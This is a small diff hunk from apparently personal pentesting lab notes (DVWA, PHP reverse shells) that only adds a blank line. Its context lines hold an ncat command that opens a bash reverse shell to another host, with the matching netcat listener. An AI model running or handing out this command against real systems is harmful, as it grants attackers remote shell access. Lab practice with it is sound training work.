@@ -18,6 +18,7 @@ locate reverse | grep php
 
 # ncat shell on Linux Server
 Server: ncat 192.168.29.1 4444 -e /bin/bash
+
 Client: nc -lnvp 4444
 
 # DVWA File Upload high
